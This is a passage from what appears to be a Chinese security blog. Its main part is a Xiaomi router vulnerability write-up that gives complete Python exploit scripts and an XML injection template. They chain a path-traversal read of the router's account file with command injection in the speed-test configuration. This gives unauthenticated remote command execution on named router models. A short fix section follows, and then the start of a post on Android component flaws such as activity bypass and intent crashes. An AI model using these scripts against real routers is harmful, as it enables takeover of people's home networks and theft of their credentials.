class="keyword">elseif</span>(pid == <span class="number">-1</span>) <span class="keyword">then</span></span><br><span class="line">		done()</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>调用的地方貌似有好几个，其中<code>/usr/lib/lua/luci/controller/api/xqnetdetect.lua</code>中</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netspeed</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> XQPreference = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.XQPreference&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> XQNSTUtil = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.module.XQNetworkSpeedTest&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> code = <span class="number">0</span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line">    <span class="keyword">local</span> history = LuciHttp.formvalue(<span class="string">&quot;history&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> history <span class="keyword">then</span></span><br><span class="line">        result[<span class="string">&quot;bandwidth&quot;</span>] = <span class="built_in">tonumber</span>(XQPreference.get(<span class="string">&quot;BANDWIDTH&quot;</span>, <span class="number">0</span>, <span class="string">&quot;xiaoqiang&quot;</span>))</span><br><span class="line">        result[<span class="string">&quot;download&quot;</span>] = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>, <span class="number">128</span> * result.bandwidth))</span><br><span class="line">        result[<span class="string">&quot;bandwidth2&quot;</span>] = <span class="built_in">tonumber</span>(XQPreference.get(<span class="string">&quot;BANDWIDTH2&quot;</span>, <span class="number">0</span>, <span class="string">&quot;xiaoqiang&quot;</span>))</span><br><span class="line">        result[<span class="string">&quot;upload&quot;</span>] = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>, <span class="number">128</span> * result.bandwidth2))</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;/etc/init.d/miqos stop&quot;</span>)</span><br><span class="line">        <span class="comment">-- 这里调用了downloadSpeedTest</span></span><br><span class="line">        <span class="keyword">local</span> download = XQNSTUtil.downloadSpeedTest()</span><br><span class="line">        <span class="keyword">if</span> download <span class="keyword">then</span></span><br><span class="line">            result[<span class="string">&quot;download&quot;</span>] = download</span><br><span class="line">            result[<span class="string">&quot;bandwidth&quot;</span>] = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>, <span class="number">8</span> * download/<span class="number">1024</span>))</span><br><span class="line">            XQPreference.set(<span class="string">&quot;BANDWIDTH&quot;</span>, <span class="built_in">tostring</span>(result.bandwidth), <span class="string">&quot;xiaoqiang&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            code = <span class="number">1588</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> code ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">           result[<span class="string">&quot;msg&quot;</span>] = XQErrorUtil.getErrorMessage(code)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;/etc/init.d/miqos start&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    result[<span class="string">&quot;code&quot;</span>] = code</span><br><span class="line">    LuciHttp.write_json(result)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">downloadSpeedTest</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> speedtest = <span class="string">&quot;/usr/bin/download_speedtest&quot;</span></span><br><span class="line">    <span class="keyword">local</span> speed</span><br><span class="line">    <span class="comment">-- 直接调用sh文件</span></span><br><span class="line">    <span class="keyword">for</span> _, line <span class="keyword">in</span> <span class="built_in">ipairs</span>(LuciUtil.execl(speedtest)) <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> XQFunction.isStrNil(line) <span class="keyword">and</span> line:<span class="built_in">match</span>(<span class="string">&quot;^avg rx:&quot;</span>) <span class="keyword">then</span></span><br><span class="line">            speed = line:<span class="built_in">match</span>(<span class="string">&quot;^avg rx:(%S+)&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> speed <span class="keyword">then</span></span><br><span class="line">                speed = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>,speed/<span class="number">8</span>))</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> speed</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>所以，我们只需要构造恶意的<code>speedtest_urls.xml</code>文件，构造备份文件，上传备份文件，然后调用网络测试相关的接口，即可以实现命令注入。</p>
<ol start="3">
<li><strong>实现命令执行poc</strong></li>
</ol>
<p>template.xml文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">class</span> <span class="attr">type</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">class</span> <span class="attr">type</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://192.168.31.1 -q -O /dev/null;&#123;command&#125;&gt;/tmp/1.txt; exit; wget http://192.168.31.1  &quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">class</span> <span class="attr">type</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.taobao.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.so.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.qq.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.sohu.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.tudou.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.360doc.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.kankan.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.speedtest.cn/&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>remote_command_execution_vulnerability.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## get stok</span></span><br><span class="line">stok = <span class="built_in">input</span>(<span class="string">&quot;stok: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## make config file</span></span><br><span class="line">command = <span class="built_in">input</span>(<span class="string">&quot;command: &quot;</span>)</span><br><span class="line">speed_test_filename = <span class="string">&quot;speedtest_urls.xml&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;template.xml&quot;</span>,<span class="string">&quot;rt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	template = f.read()</span><br><span class="line">data = template.<span class="built_in">format</span>(command=command)</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;speedtest_urls.xml&quot;</span>,<span class="string">&#x27;wt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;payload.tar.gz&quot;</span>, <span class="string">&quot;w:gz&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">	<span class="comment"># tar.add(&quot;cfg_backup.des&quot;)</span></span><br><span class="line">	<span class="comment"># tar.add(&quot;cfg_backup.mbu&quot;)</span></span><br><span class="line">	tar.add(<span class="string">&quot;speedtest_urls.xml&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## upload config file</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start uploading config file ...&quot;</span>)</span><br><span class="line">r1 = requests.post(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/misystem/c_upload&quot;</span>.<span class="built_in">format</span>(stok), files=&#123;<span class="string">&quot;image&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;payload.tar.gz&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;, proxies=proxies)</span><br><span class="line"><span class="comment"># print(r1.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## exec download speed test, exec command</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start exec command...&quot;</span>)</span><br><span class="line">r2 = requests.get(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/xqnetdetect/netspeed&quot;</span>.<span class="built_in">format</span>(stok), proxies=proxies)</span><br><span class="line"><span class="comment"># print(r2.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## read result file</span></span><br><span class="line">r3 = requests.get(<span class="string">&quot;http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt&quot;</span>, proxies=proxies)</span><br><span class="line"><span class="keyword">if</span> r3.status_code == <span class="number">200</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;success, vul&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(r3.text)</span><br></pre></td></tr></table></figure>

<h1 id="三、结合二者，无需登录远程命令执行"><a href="#三、结合二者，无需登录远程命令执行" class="headerlink" title="三、结合二者，无需登录远程命令执行"></a>三、结合二者，无需登录远程命令执行</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span>():</span></span><br><span class="line">    <span class="comment">## get mac</span></span><br><span class="line">    r0 = requests.get(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/web&quot;</span>, proxies=proxies)</span><br><span class="line">    mac = re.findall(<span class="string">r&#x27;deviceId = \&#x27;(.*?)\&#x27;&#x27;</span>, r0.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(mac)</span></span><br><span class="line">    <span class="keyword">return</span> mac</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_account_str</span>():</span></span><br><span class="line">    <span class="comment">## read /etc/config/account</span></span><br><span class="line">    r1 = requests.get(<span class="string">&quot;http://192.168.31.1/api-third-party/download/extdisks../etc/config/account&quot;</span>, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(r1.text)</span><br><span class="line">    account_str = re.findall(<span class="string">r&#x27;admin\&#x27;? \&#x27;(.*)\&#x27;&#x27;</span>, r1.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> account_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_nonce</span>(<span class="params">mac</span>):</span></span><br><span class="line">    type_ = <span class="number">0</span></span><br><span class="line">    deviceId = mac</span><br><span class="line">    time_ = <span class="built_in">int</span>(time.time())</span><br><span class="line">    rand = random.randint(<span class="number">0</span>, <span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%d_%s_%d_%d&quot;</span> % (type_, deviceId, time_, rand)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_password</span>(<span class="params">nonce, account_str</span>):</span></span><br><span class="line">    m = hashlib.sha1()</span><br><span class="line">    m.update((nonce + account_str).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mac = get_mac()</span><br><span class="line">account_str = get_account_str()</span><br><span class="line"><span class="comment">## login, get stok</span></span><br><span class="line">nonce = create_nonce(mac)</span><br><span class="line">password = calc_password(nonce, account_str)</span><br><span class="line">data = <span class="string">&quot;username=admin&amp;password=&#123;password&#125;&amp;logtype=2&amp;nonce=&#123;nonce&#125;&quot;</span>.<span class="built_in">format</span>(password=password, nonce=nonce)</span><br><span class="line">r2 = requests.post(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/api/xqsystem/login&quot;</span>,</span><br><span class="line">                   data=data,</span><br><span class="line">                   headers=&#123;</span><br><span class="line">                       <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;,</span><br><span class="line">                   proxies=proxies)</span><br><span class="line"><span class="comment"># print(r2.text)</span></span><br><span class="line">stok = re.findall(<span class="string">r&#x27;&quot;token&quot;:&quot;(.*?)&quot;&#x27;</span>, r2.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stok=&quot;</span> + stok)</span><br><span class="line"></span><br><span class="line"><span class="comment">## make config file</span></span><br><span class="line">command = <span class="built_in">input</span>(<span class="string">&quot;command: &quot;</span>)</span><br><span class="line">speed_test_filename = <span class="string">&quot;speedtest_urls.xml&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;template.xml&quot;</span>, <span class="string">&quot;rt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    template = f.read()</span><br><span class="line">data = template.<span class="built_in">format</span>(command=command)</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;speedtest_urls.xml&quot;</span>, <span class="string">&#x27;wt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;payload.tar.gz&quot;</span>, <span class="string">&quot;w:gz&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    <span class="comment"># tar.add(&quot;cfg_backup.des&quot;)</span></span><br><span class="line">    <span class="comment"># tar.add(&quot;cfg_backup.mbu&quot;)</span></span><br><span class="line">    tar.add(<span class="string">&quot;speedtest_urls.xml&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## upload config file</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start uploading config file ...&quot;</span>)</span><br><span class="line">r1 = requests.post(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/misystem/c_upload&quot;</span>.<span class="built_in">format</span>(stok),</span><br><span class="line">                   files=&#123;<span class="string">&quot;image&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;payload.tar.gz&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;, proxies=proxies)</span><br><span class="line"><span class="comment"># print(r1.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## exec download speed test, exec command</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start exec command...&quot;</span>)</span><br><span class="line">r2 = requests.get(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/xqnetdetect/netspeed&quot;</span>.<span class="built_in">format</span>(stok), proxies=proxies)</span><br><span class="line"><span class="comment"># print(r2.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## read result file</span></span><br><span class="line">r3 = requests.get(<span class="string">&quot;http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt&quot;</span>, proxies=proxies)</span><br><span class="line"><span class="keyword">if</span> r3.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success, vul&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r3.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1647248331898-72c86e8b-c2bc-4e2b-9925-43477c1ebd66.png" alt="img"></p>
<p>经测试，在小米系列路由器中存在该漏洞，如小米路由器R3G、小米路由器R3A、小米路由器R4等</p>
<h1 id="四、修复方案"><a href="#四、修复方案" class="headerlink" title="四、修复方案"></a>四、修复方案</h1><h2 id="1、任意文件读取"><a href="#1、任意文件读取" class="headerlink" title="1、任意文件读取"></a>1、任意文件读取</h2><p>将<code>/etc/sysapihttpd/sysapihttpd.conf</code>中的形如以下形式修改为</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /xxx &#123;</span><br><span class="line">  <span class="attribute">alias</span> /abc/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改为</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /xxx/ &#123;</span><br><span class="line">  <span class="attribute">alias</span> /abc/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2、远程命令执行"><a href="#2、远程命令执行" class="headerlink" title="2、远程命令执行"></a>2、远程命令执行</h2><ol>
<li>将备份文件格式修改为特定格式，直接读取备份文件内容，而不需使用解压</li>
<li>从<code>speedtest_urls.xml</code>中读取urls时，进行必要的过滤，防止命令注入</li>
</ol>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>常见Android组件/控件漏洞</title>
    <url>/post/cb60dfd6.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&emsp;&emsp;对于 Android app 本身来说，也是会存在一些组件安全漏洞的，本文就介绍一些常见的 Android 组件漏洞。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/android.jpg"></p>
<h1 id="二、Android组件安全"><a href="#二、Android组件安全" class="headerlink" title="二、Android组件安全"></a>二、Android组件安全</h1><p>&emsp;&emsp;首先要知道，Android 中最重要的风险点就是 <code>android:exported=&quot;true&quot;</code> 这一属性。组件被导出就意味着大概率会产生漏洞。这是不同应用程序间共享数据的唯一方式，因为android 没有提供所有应用共同访问的公共存储区。比如通讯录数据。</p>
<p>&emsp;&emsp;首先了解一下四大组件：<strong>activity</strong>，<strong>service</strong>，<strong>broadcast</strong>，<strong>contentprovider</strong>。</p>
<h2 id="2-1-四大组件"><a href="#2-1-四大组件" class="headerlink" title="2.1 四大组件"></a>2.1 四大组件</h2><h3 id="2-1-1-activity"><a href="#2-1-1-activity" class="headerlink" title="2.1.1 activity"></a>2.1.1 activity</h3><p>&emsp;&emsp;对于 app 来说，每一个界面都是一个 activity，每一个 activity 都会有着不同的功能，比如注册，登录，手势密码等。每一个 activity 的切换需要不同的条件。  </p>
<h3 id="2-1-2-service"><a href="#2-1-2-service" class="headerlink" title="2.1.2 service"></a>2.1.2 service</h3><p>&emsp;&emsp;service 服务，伴随着程序启动，会一直在后台运行，主要是检测作用，检测客户端的状态，上传用户的操作。</p>
<h3 id="2-1-3-broadcast"><a href="#2-1-3-broadcast" class="headerlink" title="2.1.3 broadcast"></a>2.1.3 broadcast</h3><p>&emsp;&emsp;broadcast 分为两个方面，广播发送者和广播接收者。Android 提供一整套的 api，允许 app 自由的发送和接收广播。</p>
<h3 id="2-1-4-contentprovider"><a href="#2-1-4-contentprovider" class="headerlink" title="2.1.4 contentprovider"></a>2.1.4 contentprovider</h3><p>&emsp;&emsp;contentProvider是用来保存或者获取数据，并使其对所有应用程序可见。</p>
<h1 id="三、越权绕过"><a href="#三、越权绕过" class="headerlink" title="三、越权绕过"></a>三、越权绕过</h1><p>&emsp;&emsp;对于 <strong>activity</strong> 组件，主要会存在越权绕过，比如绕过手势密码，跳过验证阶段。此处可以利用直接启动手势密码之后的活动来进行验证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">am start -n 包名/.活动名</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;若是可以直接启动，则证明存在越权漏洞。</p>
<h1 id="四、拒绝服务攻击"><a href="#四、拒绝服务攻击" class="headerlink" title="四、拒绝服务攻击"></a>四、拒绝服务攻击</h1><p>&emsp;&emsp;还有拒绝服务攻击，Android 提供 Intent 机制来协助应用间的交互与通讯，Intent 负责对一次操作的动作、动作涉及的数据进行描述，系统则根据此 Intent 描述，来调用对应的 Activity、 servicer 和 BroadCast 等组件，来完成组件的调用。  </p>
<p>&emsp;&emsp;如果程序没有对 <code>**Intent.getXXXExtra()</code> 获取的异常或者畸形数据处理时没有进行异常捕获，就会导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来使该应用崩溃，简单的说就是通过 intent 发送空数据、异常或畸形数据给应用，来实现让应用崩溃的目的。</p>
<p>&emsp;&emsp;对应的不同报错信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.NullPointerException，原因是程序没有对getAction()等获取到的数据进行空指针判断。intent.putExtra(&quot;&quot;, &quot;&quot;);导致空指针异常导致应用崩溃</span><br><span class="line">Java.lang.ClassCastException 原因是程序没有getSerializableExtra()等获取到的数据进行类型判断而进行强制类型转换</span><br><span class="line">Java.lang.IndexOutOfBoundsException，原因是程序没有对getIntegerArrayListExtra()等获取到的数据数组元素大小的判断</span><br><span class="line">Java.lang.ClassNotFoundException，原因是程序没有无法找到</span><br><span class="line">从getSerializableExtra()获取到的序列化类对象的类定义</span><br></pre></td></tr></table></figure>

<h1 id="五、Service服务暴露"><a href="#五、Service服务暴露" class="headerlink" title="五、Service服务暴露"></a>五、Service服务暴露</h1><p>&emsp;&emsp;以之前版本的某 app 为例，其中的升级服务，传入 PushMsg 的 Serializable 的数据。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636456892408-24952e56-cdcd-47dc-a6a0-122429e25cf6.webp" alt="img"></p>
<p>&emsp;&emsp;此时恶意伪造并启动暴露的service</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636456914207-b340fdf8-de2e-46b6-b43f-7e243895a36c.webp" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636456928007-51db752b-4e6f-4570-acfc-cf6c38d3c85a.webp" alt="img"></p>
<h1 id="六、Broadcast暴露"><a href="#六、Broadcast暴露" class="headerlink" title="六、Broadcast暴露"></a>六、Broadcast暴露</h1><p>&emsp;&emsp;比如目标程序如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    Intent v1 = <span class="keyword">new</span> Intent();</span><br><span class="line">    v1.setAction(<span class="string">&quot;com.simple.action.server_running&quot;</span>);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;local_ip&quot;</span>,v0.h);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;port&quot;</span>,v0.i);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;code&quot;</span>,v0.g);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;connected&quot;</span>,v0.s);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;pwd_predefined&quot;</span>,v0.r);</span><br><span class="line">    <span class="keyword">if</span>(!TextUtils.isEmpty(v0.t))&#123;</span><br><span class="line">        v1.putExtra(<span class="string">&quot;connected_usr&quot;</span>,v0.t);</span><br><span class="line">    &#125;</span><br><span class="line">    sendBroadcast(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;该程序通过 intent 隐式传递，并通过 action 匹配发送一个广播，这样系统内其他程序都可以接收到这个广播，然后在广播接收者中编写接收代码，这样就可以通过攻击代码获取敏感数据信息</p>
